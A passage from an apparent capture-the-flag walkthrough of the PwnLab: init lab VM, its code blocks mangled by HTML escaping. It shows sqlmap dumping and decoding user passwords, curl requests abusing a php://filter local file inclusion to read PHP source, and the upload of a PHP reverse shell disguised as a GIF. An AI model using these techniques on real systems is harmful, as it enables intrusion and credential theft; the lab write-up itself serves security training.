</span><span class='line'><span class="p">|</span> pass             <span class="p">|</span> user   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> <span class="nv">aVN2NVltMkdSbw</span><span class="o">==</span> <span class="p">|</span> kane   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="nv">Sld6WHVCSkpOeQ</span><span class="o">==</span> <span class="p">|</span> kent   <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="nv">U0lmZHNURW42SQ</span><span class="o">==</span> <span class="p">|</span> mike   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>Users.users<span class="p">&amp;</span>rsquo<span class="p">;</span> dumped to CSV file <span class="p">&amp;</span>lsquo<span class="p">;</span>/root/.sqlmap/output/10.1.1.140/dump/Users/users.csv<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 20:03:24
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, here we go, got the username and password (base64 encoded), and the user/pass are:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane / iSv5Ym2GRo
</span><span class='line'>kent / JWzXuBJJNy
</span><span class='line'>mike / SIfdsTEn6I
</span></code></pre></td></tr></table></div></figure></p>

<p>I also checked if I can write file via MySQL, but sounds like we don&rsquo;t have enough privilege.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="p">&amp;</span>lsquo<span class="p">;</span>mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>current-user <span class="p">&amp;</span>ndash<span class="p">;</span>is-dba
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 22:37:40&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
</span><span class='line'>current user:    <span class="p">&amp;</span>lsquo<span class="p">;</span>root@%<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> current user is DBA
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current user
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1142, <span class="p">&amp;</span>ldquo<span class="p">;</span>SELECT <span class="nb">command </span>denied to user <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span>@<span class="p">&amp;</span>lsquo<span class="p">;</span>10.1.1.132<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> table <span class="p">&amp;</span>lsquo<span class="p">;</span>user<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'>current user is DBA:    False
</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> shutting down at 22:37:40
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to the current user is not DBA, I could not write file via MySQL ROOT account.</p>

<p>After login as user <code>kane</code>, I&rsquo;m trying to upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">php reverse shell</a>, but the web application only accept image files.</p>

<p><img class="left" src="/downloads/pwnlab_init/1.png"></p>

<p>In order to bypass the file extention limit, I downloaded the file <code>upload.php</code> by using the previouse LFI exploition method.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=upload&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>upload&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmICghaXNzZXQoJF9TRVNTSU9OWyd1c2VyJ10pKSB7IGRpZSgnWW91IG11c3QgYmUgbG9nIGluLicpOyB9DQo/Pg0KPGh0bWw+DQoJPGJvZHk+DQoJCTxmb3JtIGFjdGlvbj0nJyBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KCQkJPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2ZpbGUnIGlkPSdmaWxlJyAvPg0KCQkJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJy8+DQoJCTwvZm9ybT4NCgk8L2JvZHk+DQo8L2h0bWw+DQo8P3BocCANCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7DQoJaWYgKCRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA8PSAwKSB7DQoJCSRmaWxlbmFtZSAgPSAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsNCgkJJGZpbGV0eXBlICA9ICRfRklMRVNbJ2ZpbGUnXVsndHlwZSddOw0KCQkkdXBsb2FkZGlyID0gJ3VwbG9hZC8nOw0KCQkkZmlsZV9leHQgID0gc3RycmNocigkZmlsZW5hbWUsICcuJyk7DQoJCSRpbWFnZWluZm8gPSBnZXRpbWFnZXNpemUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddKTsNCgkJJHdoaXRlbGlzdCA9IGFycmF5KCIuanBnIiwiLmpwZWciLCIuZ2lmIiwiLnBuZyIpOyANCg0KCQlpZiAoIShpbl9hcnJheSgkZmlsZV9leHQsICR3aGl0ZWxpc3QpKSkgew0KCQkJZGllKCdOb3QgYWxsb3dlZCBleHRlbnNpb24sIHBsZWFzZSB1cGxvYWQgaW1hZ2VzIG9ubHkuJyk7DQoJCX0NCg0KCQlpZihzdHJwb3MoJGZpbGV0eXBlLCdpbWFnZScpID09PSBmYWxzZSkgew0KCQkJZGllKCdFcnJvciAwMDEnKTsNCgkJfQ0KDQoJCWlmKCRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvZ2lmJyAmJiAkaW1hZ2VpbmZvWydtaW1lJ10gIT0gJ2ltYWdlL2pwZWcnICYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvanBnJyYmICRpbWFnZWluZm9bJ21pbWUnXSAhPSAnaW1hZ2UvcG5nJykgew0KCQkJZGllKCdFcnJvciAwMDInKTsNCgkJfQ0KDQoJCWlmKHN1YnN0cl9jb3VudCgkZmlsZXR5cGUsICcvJyk+MSl7DQoJCQlkaWUoJ0Vycm9yIDAwMycpOw0KCQl9DQoNCgkJJHVwbG9hZGZpbGUgPSAkdXBsb2FkZGlyIC4gbWQ1KGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkuJGZpbGVfZXh0Ow0KDQoJCWlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkZmlsZSkpIHsNCgkJCWVjaG8gIjxpbWcgc3JjPVwiIi4kdXBsb2FkZmlsZS4iXCI+PGJyIC8+IjsNCgkJfSBlbHNlIHsNCgkJCWRpZSgnRXJyb3IgNCcpOw0KCQl9DQoJfQ0KfQ0KDQo/Pg<span class="o">==</span>&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>After decoded the base64 code, I got the following <code>upload.php</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'>session_start<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="o">(</span>!isset<span class="o">(</span><span class="nv">$&lt;</span>em&gt;SESSION<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>user<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]))</span> <span class="o">{</span> die<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>You must be log in.<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>    &lt;body&gt;
</span><span class='line'>        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;post&#39;</span> <span class="nv">enctype</span><span class="o">=</span><span class="s1">&#39;multipart/form-data&#39;</span>&gt;
</span><span class='line'>            &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> <span class="nv">id</span><span class="o">=</span><span class="s1">&#39;file&#39;</span> /&gt;
</span><span class='line'>            &lt;input <span class="nb">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;Upload&#39;</span>/&gt;
</span><span class='line'>        &lt;/form&gt;
</span><span class='line'>    &lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$&lt;</span>/em&gt;POST<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>submit<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="nv">$&lt;</span>em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span>error<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> 0<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$&lt;</span>/em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span>name<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$&lt;</span>em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nb">type</span><span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>upload/<span class="p">&amp;</span>rsquo<span class="p">;;</span>
</span><span class='line'>        <span class="nv">$file_ext</span>  <span class="o">=</span> strrchr<span class="o">(</span><span class="nv">$filename</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>.<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$imageinfo</span> <span class="o">=</span> getimagesize<span class="o">(</span><span class="nv">$&lt;</span>/em&gt;FILES<span class="o">[</span><span class="p">&amp;</span>lsquo<span class="p">;</span>file<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">][</span><span class="p">&amp;</span>lsquo<span class="p">;</span>tmp_name<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$whitelist</span> <span class="o">=</span> array<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>.jpg<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>.jpeg<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>.gif<span class="p">&amp;</span>rdquo<span class="p">;</span>,<span class="p">&amp;</span>ldquo<span class="p">;</span>.png<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="k">if</span> <span class="o">(</span>!<span class="o">(</span>in_array<span class="o">(</span><span class="nv">$file_ext</span>, <span class="nv">$whitelist</span><span class="o">)))</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filetype</span>,<span class="s1">&#39;image&#39;</span><span class="o">)</span> <span class="o">===</span> <span class="nb">false</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 001&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span><span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> <span class="nv">$imageinfo</span><span class="o">[</span><span class="s1">&#39;mime&#39;</span><span class="o">]</span> !<span class="o">=</span> <span class="s1">&#39;image/png&#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 002&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="o">(</span>substr_count<span class="o">(</span><span class="nv">$filetype</span>, <span class="s1">&#39;/&#39;</span><span class="o">)</span><span class="p">&amp;</span>gt<span class="p">;</span>1<span class="o">){</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 003&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> . md5<span class="o">(</span>basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;name&#39;</span><span class="o">]))</span>.<span class="nv">$file_ext</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="o">]</span>, <span class="nv">$uploadfile</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;&amp;lt;img src=\&quot;&quot;</span>.<span class="nv">$uploadfile</span>.<span class="s2">&quot;\&quot;&amp;gt;&amp;lt;br /&amp;gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>        die<span class="o">(</span><span class="s1">&#39;Error 4&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;?&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Here, this <code>***.gif</code> file is the php reverse shell.</p>

<p><img class="left" src="/downloads/pwnlab_init/2.png"></p>

<p>Now the evil php has been uploaded and I have to find a way to trigger it. So I download the <code>index.php</code> to have a check.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.140/?page=php://filter/convert.base64-encode/resource=index&quot;</span>&gt;http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://f4l13n5n0w.github.io/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4<span class="o">=</span>&lt;/center&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
